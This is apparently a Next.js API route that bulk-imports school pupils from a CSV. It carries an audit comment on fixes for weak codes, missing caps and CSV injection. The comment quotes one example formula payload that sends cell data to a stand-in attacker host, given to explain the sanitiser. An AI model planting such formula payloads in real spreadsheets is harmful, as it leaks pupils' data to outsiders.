// ─── POST /api/schools/import-scholars ──────────────────────────────────────
// Bulk CSV import of scholars for a school. Only proprietors/admins of the
// target school can call it.
//
// NOTE (April 22 2026 security audit):
//   Previous version had several issues stacked together:
//
//   (1) Used the user's SSR (RLS-scoped) client for writes to tables that are
//       service-role-only (`scholar_invitations` has `rls_invitations_service`
//       as its only policy). Those INSERTs would silently fail for a real
//       proprietor session, so either this flow was broken in production or
//       there was a latent service-role client leak further up the stack.
//
//   (2) No file-size or MIME cap on the upload. `await file.arrayBuffer()`
//       with a multi-GB payload OOMs the serverless host. Even without
//       malice, a proprietor exporting a wrong sheet ships us a 40 MB CSV.
//
//   (3) Weak code entropy:
//         access_code   = randomBytes(3).toString('hex') → 24 bits (~16M)
//         validation_code = randomBytes(4)              → 32 bits (~4B)
//       With a 7-day expiry window and ~tens of thousands of pending codes
//       across schools, a blind-guess attack against the claim endpoint is
//       feasible. Both are now 64 bits (randomBytes(8)).
//
//   (4) CSV-injection risk on re-export. A scholar name of
//       `=HYPERLINK("http://evil.tld?"&A1,"click")` stored verbatim fires as
//       a formula when the school later exports their class roster. We now
//       prepend `'` on ingest for any cell beginning with `=+-@\t\r`.
//
//   (5) Sequential `await sendEmail(...)` inside the per-row loop. One slow
//       SMTP response blocks the whole import. Emails are now queued and
//       sent in chunks with `Promise.allSettled` after DB work completes.
//
//   (6) `console.error` instead of structured logger, rate limit absent.
//
// Flow:
//   1. SSR client → auth + `school_roles` check (proprietor/admin for the
//      target school).
//   2. Per-user+school rate limit (5 imports / hour) via Upstash.
//   3. Size/MIME caps, then parseCsvSafe (2 MB, 2000 rows).
//   4. Switch to service-role client for DB writes (authz already done).
//   5. Per-row: find-or-create class (race-safe), create scholar + enrolment
//      + invitation with 64-bit codes.
//   6. After the loop: send invite emails in chunks of 10.
// ────────────────────────────────────────────────────────────────────────────

import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';
import crypto from 'crypto';

import { sendEmail } from '@/lib/email';
import { EMAIL_TEMPLATES } from '@/lib/emailTemplates';
import { generateCodename } from '@/lib/codename';
import logger from '@/lib/logger';
import { getServiceRoleClient } from '@/lib/security/serviceRole';
import { supabaseKeys } from '@/lib/env';
import { parseCsvSafe } from '@/lib/security/csv';
import { limit as rateLimit } from '@/lib/security/rateLimit';

export const runtime = 'nodejs';

// ── Constants ───────────────────────────────────────────────────────────────
const MAX_CSV_BYTES = 2 * 1024 * 1024;   // 2 MB
const MAX_CSV_ROWS = 2000;                // hard cap; most partner schools ≤ 1500
const EMAIL_CHUNK_SIZE = 10;              // Promise.allSettled batch size
const ALLOWED_MIME = new Set([
  'text/csv',
  'application/csv',
  'application/vnd.ms-excel', // some browsers tag CSV as Excel
  'text/plain',               // Safari occasionally
  '',                         // no type → fall back to extension check
]);
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
const ACADEMIC_YEAR_RE = /^[0-9]{4}-[0-9]{4}$/;
const FORMULA_PREFIX_RE = /^[=+\-@\t\r]/;

// ── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Neutralise cells that would be interpreted as formulas by spreadsheet apps
 * if this value is ever re-exported to CSV. Stores `'=foo` instead of `=foo`.
 * Applied to free-text fields the proprietor types into the sheet.
 */
function sanitiseCell(value) {
  if (typeof value !== 'string') return value;
  return FORMULA_PREFIX_RE.test(value) ? `'${value}` : value;
}

/**
 * 64-bit random hex (16 chars). Shared by access_code and validation_code.
 * randomBytes(3) (24 bits) was trivially guessable with a 7-day window.
 */
function randomCode64() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function buildSsrClient(cookieStore) {
  return createServerClient(
    supabaseKeys.url(),
    supabaseKeys.publishable(),
    {
      cookies: {
        getAll: () => cookieStore.getAll(),
        setAll: (cookiesToSet) => {
          cookiesToSet.forEach(({ name, value, options }) =>
            cookieStore.set(name, value, options)
          );
        },
      },
    }
  );
}

/**
 * Find-or-create class, race-safe under duplicate uploads. Uses the service
 * role client since this path runs after authz. Retries a SELECT on unique
 * constraint violation (23505) so two parallel imports can race without
 * anyone losing a row.
 */
async function findOrCreateClass(admin, { schoolId, name, yearLevel, curriculum }) {
  const { data: existing, error: selectErr } = await admin
    .from('classes')
    .select('id')
    .eq('school_id', schoolId)
    .eq('name', name)
    .maybeSingle();

  if (selectErr) throw selectErr;
  if (existing) return existing.id;

  const { data: created, error: insertErr } = await admin
    .from('classes')
    .insert({
      school_id: schoolId,
      name,
      year_level: yearLevel,
      curriculum,
    })
    .select('id')
    .single();

  if (!insertErr) return created.id;

  // Parallel import won the race — re-select.
  if (insertErr.code === '23505') {
    const { data: raced, error: raceErr } = await admin
      .from('classes')
      .select('id')
      .eq('school_id', schoolId)
      .eq('name', name)
      .maybeSingle();
    if (raceErr || !raced) throw insertErr;
    return raced.id;
  }

  throw insertErr;
}

// ── Handler ─────────────────────────────────────────────────────────────────
export async function POST(request) {
  try {
    const cookieStore = await cookies();
    const supabase = buildSsrClient(cookieStore);

    // ── 1. Auth ────────────────────────────────────────────────────────────
    const {
      data: { session },
    } = await supabase.auth.getSession();
    if (!session?.user) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    // ── 2. Parse form (lightweight) ────────────────────────────────────────
    let formData;
    try {
      formData = await request.formData();
    } catch {
      return NextResponse.json(
        { error: 'Invalid multipart body' },
        { status: 400 }
      );
    }

    const file = formData.get('file');
    const schoolIdRaw = formData.get('school_id');
    const academicYearRaw = formData.get('academic_year');

    if (!file || !schoolIdRaw) {
      return NextResponse.json(
        { error: 'Missing file or school_id' },
        { status: 400 }
      );
    }

    const schoolId = String(schoolIdRaw);
    if (!UUID_RE.test(schoolId)) {
      return NextResponse.json(
        { error: 'Invalid school_id' },
        { status: 400 }
      );
    }

    // Academic year: accept either explicit 'YYYY-YYYY' or default to current.
    let academicYear;
    if (academicYearRaw) {
      academicYear = String(academicYearRaw);
      if (!ACADEMIC_YEAR_RE.test(academicYear)) {
        return NextResponse.json(
          { error: 'Invalid academic_year (expected YYYY-YYYY)' },
          { status: 400 }
        );
      }
    } else {
      const y = new Date().getFullYear();
      academicYear = `${y}-${y + 1}`;
    }

    // ── 3. File guards (before reading the buffer) ─────────────────────────
    if (typeof file.size === 'number' && file.size > MAX_CSV_BYTES) {
      return NextResponse.json(
        { error: `File too large (max ${MAX_CSV_BYTES} bytes)` },
        { status: 413 }
      );
    }
    const fileType = (file.type || '').toLowerCase();
    const fileName = (file.name || '').toLowerCase();
    const extensionOk = fileName.endsWith('.csv') || fileName.endsWith('.txt');
    if (!ALLOWED_MIME.has(fileType) && !extensionOk) {
      return NextResponse.json(
        { error: 'Unsupported file type. Upload a CSV.' },
        { status: 415 }
      );
    }

    // ── 4. Authorisation: proprietor/admin for this school ─────────────────
    const { data: roleData, error: roleError } = await supabase
      .from('school_roles')
      .select('role')
      .eq('user_id', session.user.id)
      .eq('school_id', schoolId)
      .maybeSingle();

    if (roleError) {
      logger.error('import_scholars_role_lookup_failed', {
        userId: session.user.id,
        schoolId,
        error: roleError,
      });
      return NextResponse.json(
        { error: 'Failed to verify school role' },
        { status: 500 }
      );
    }
    if (!roleData || !['proprietor', 'admin'].includes(roleData.role)) {
      return NextResponse.json(
        { error: 'Forbidden. Proprietor or admin role required.' },
        { status: 403 }
      );
    }

    // ── 5. Rate limit (per user+school): 5 imports / hour ──────────────────
    const rlKey = `import-scholars:${session.user.id}:${schoolId}`;
    const rl = await rateLimit({ key: rlKey, windowSec: 3600, max: 5 });
    if (!rl.success) {
      const retryAfter = Math.max(1, Math.ceil((rl.reset - Date.now()) / 1000));
      return NextResponse.json(
        { error: 'Too many imports. Try again later.' },
        {
          status: 429,
          headers: { 'Retry-After': String(retryAfter) },
        }
      );
    }

    // ── 6. Parse CSV under caps ────────────────────────────────────────────
    let parsed;
    try {
      parsed = await parseCsvSafe(file, {
        maxBytes: MAX_CSV_BYTES,
        maxRows: MAX_CSV_ROWS,
      });
    } catch (parseErr) {
      if (parseErr?.code === 'csv_too_large') {
        return NextResponse.json(
          { error: `File too large (max ${MAX_CSV_BYTES} bytes)` },
          { status: 413 }
        );
      }
      return NextResponse.json(
        { error: `CSV parse error: ${parseErr.message}` },
        { status: 400 }
      );
    }

    if (parsed.truncated) {
      return NextResponse.json(
        {
          error: `CSV exceeds ${MAX_CSV_ROWS} rows. Split into smaller batches.`,
        },
        { status: 413 }
      );
    }

    // Normalise headers to lowercase_with_underscores so the downstream code
    // can key off known names regardless of the proprietor's case/spacing.
    const normalise = (h) => h.toLowerCase().trim().replace(/\s+/g, '_');
    const headerMap = {};
    parsed.headers.forEach((h, i) => {
      headerMap[normalise(h)] = i;
    });

    const required = ['student_name', 'class_name', 'year_level'];
    for (const col of required) {
      if (!(col in headerMap)) {
        return NextResponse.json(
          {
            error:
              'CSV must include: student_name, class_name, year_level, and (parent_email or parent_phone)',
          },
          { status: 400 }
        );
      }
    }
    const hasContact = 'parent_email' in headerMap || 'parent_phone' in headerMap;
    if (!hasContact) {
      return NextResponse.json(
        {
          error:
            'CSV must include at least one of: parent_email, parent_phone',
        },
        { status: 400 }
      );
    }

    // Build row objects keyed by normalised header — rawRows[0] is the header,
    // so start at index 1.
    const records = parsed.rawRows.slice(1).map((cells) => ({
      student_name: cells[headerMap.student_name] ?? '',
      class_name: cells[headerMap.class_name] ?? '',
      year_level: cells[headerMap.year_level] ?? '',
      parent_email:
        headerMap.parent_email !== undefined
          ? cells[headerMap.parent_email] ?? ''
          : '',
      parent_phone:
        headerMap.parent_phone !== undefined
          ? cells[headerMap.parent_phone] ?? ''
          : '',
      curriculum:
        headerMap.curriculum !== undefined
          ? cells[headerMap.curriculum] ?? ''
          : '',
    }));

    if (records.length === 0) {
      return NextResponse.json(
        { error: 'CSV file has no data rows' },
        { status: 400 }
      );
    }

    // ── 7. Switch to service-role client for writes ────────────────────────
    // Authz has been confirmed; this bypasses the service-role-only RLS on
    // `scholar_invitations` without widening the attack surface elsewhere —
    // every write below is explicitly scoped to `schoolId`.
    const admin = getServiceRoleClient();

    // Fetch school name once (used in invite emails).
    const { data: schoolData } = await admin
      .from('schools')
      .select('name')
      .eq('id', schoolId)
      .maybeSingle();
    const schoolName = schoolData?.name || 'Your school';

    // ── 8. Per-row processing ──────────────────────────────────────────────
    const created = [];
    const skipped = [];
    const errors = [];
    const emailQueue = []; // { to, subject, htmlContent, studentName }

    for (const row of records) {
      const studentNameRaw = (row.student_name || '').trim();
      const classNameRaw = (row.class_name || '').trim();
      const parentEmail = (row.parent_email || '').trim() || null;
      const parentPhone = (row.parent_phone || '').trim() || null;
      const yearLevel = parseInt(row.year_level, 10);
      const curriculum =
        (row.curriculum || '').trim().toLowerCase() || 'ng_primary';

      // Neutralise CSV-injection triggers on free-text fields.
      const studentName = sanitiseCell(studentNameRaw);
      const className = sanitiseCell(classNameRaw);

      // ── Validate row ────────────────────────────────────────────────────
      if (!studentName || (!parentEmail && !parentPhone)) {
        skipped.push({
          row: studentName || '(missing name)',
          reason: 'Missing student_name or (parent_email/parent_phone)',
        });
        continue;
      }
      if (!className || !Number.isInteger(yearLevel) || yearLevel < 1 || yearLevel > 13) {
        errors.push({
          row: studentName,
          reason: 'Missing or invalid class_name/year_level',
        });
        continue;
      }
      if (studentName.length > 120 || className.length > 80) {
        errors.push({
          row: studentName.slice(0, 40),
          reason: 'student_name or class_name too long',
        });
        continue;
      }

      try {
        // ── Find or create class (race-safe) ──────────────────────────────
        const classId = await findOrCreateClass(admin, {
          schoolId,
          name: className,
          yearLevel,
          curriculum,
        });

        // ── Duplicate check within school + academic year ─────────────────
        const { data: dupScholar } = await admin
          .from('scholars')
          .select('id, enrolments(academic_year)')
          .eq('school_id', schoolId)
          .ilike('name', studentName)
          .maybeSingle();

        if (
          dupScholar &&
          Array.isArray(dupScholar.enrolments) &&
          dupScholar.enrolments.some((e) => e.academic_year === academicYear)
        ) {
          skipped.push({
            row: studentName,
            reason: 'Duplicate scholar in same school/year',
          });
          continue;
        }

        // ── Generate codes + codename ─────────────────────────────────────
        const codename = generateCodename();
        const accessCode = randomCode64();

        // ── Create scholar ────────────────────────────────────────────────
        const { data: scholar, error: scholarError } = await admin
          .from('scholars')
          .insert({
            name: studentName,
            school_id: schoolId,
            curriculum,
            year_level: yearLevel,
            access_code: accessCode,
            codename,
            parent_id: null,
          })
          .select('id')
          .single();

        if (scholarError) {
          errors.push({
            row: studentName,
            reason: `Failed to create scholar: ${scholarError.message}`,
          });
          continue;
        }

        // ── Create enrolment ──────────────────────────────────────────────
        const { error: enrolError } = await admin
          .from('enrolments')
          .insert({
            scholar_id: scholar.id,
            class_id: classId,
            academic_year: academicYear,
          });

        if (enrolError) {
          errors.push({
            row: studentName,
            reason: `Failed to create enrolment: ${enrolError.message}`,
          });
          continue;
        }

        // ── Create invitation ─────────────────────────────────────────────
        const validationCode = randomCode64();
        const expiresAt = new Date(
          Date.now() + 7 * 24 * 60 * 60 * 1000
        ).toISOString();

        const { error: inviteError } = await admin
          .from('scholar_invitations')
          .insert({
            scholar_id: scholar.id,
            validation_code: validationCode,
            parent_email: parentEmail,
            parent_phone: parentPhone,
            expires_at: expiresAt,
          });

        if (inviteError) {
          errors.push({
            row: studentName,
            reason: `Failed to create invitation: ${inviteError.message}`,
          });
          continue;
        }

        // Queue the invite email; we send in parallel batches after the loop.
        if (parentEmail) {
          const claimUrl = `${
            process.env.APP_URL || 'https://launchpard.com'
          }/parent/claim?code=${encodeURIComponent(validationCode)}`;
          const { subject, htmlContent } = EMAIL_TEMPLATES.scholarInvitation(
            schoolName,
            studentName,
            validationCode,
            claimUrl
          );
          emailQueue.push({ to: parentEmail, subject, htmlContent, studentName });
        }

        created.push({
          name: studentName,
          className,
          validationCode,
          accessCode,
        });
      } catch (rowErr) {
        errors.push({
          row: studentName,
          reason: rowErr?.message || 'Unknown error',
        });
      }
    }

    // ── 9. Send invitation emails in chunks ────────────────────────────────
    let emailsSent = 0;
    let emailsFailed = 0;
    for (let i = 0; i < emailQueue.length; i += EMAIL_CHUNK_SIZE) {
      const chunk = emailQueue.slice(i, i + EMAIL_CHUNK_SIZE);
      const results = await Promise.allSettled(
        chunk.map((msg) =>
          sendEmail({
            to: msg.to,
            subject: msg.subject,
            htmlContent: msg.htmlContent,
          })
        )
      );
      results.forEach((r, idx) => {
        if (r.status === 'fulfilled') {
          emailsSent += 1;
        } else {
          emailsFailed += 1;
          logger.warn('import_scholars_email_failed', {
            studentName: chunk[idx].studentName,
            error: r.reason?.message || String(r.reason),
          });
        }
      });
    }

    logger.info('import_scholars_completed', {
      userId: session.user.id,
      schoolId,
      created: created.length,
      skipped: skipped.length,
      errors: errors.length,
      emailsSent,
      emailsFailed,
    });

    return NextResponse.json({
      success: true,
      created: created.length,
      skipped: skipped.length,
      errors: errors.length,
      emails: { sent: emailsSent, failed: emailsFailed },
      details: { created, skipped, errors },
    });
  } catch (err) {
    logger.error('import_scholars_unexpected_error', {
      error: err?.message || String(err),
    });
    return NextResponse.json(
      { error: 'An error occurred during import' },
      { status: 500 }
    );
  }
}
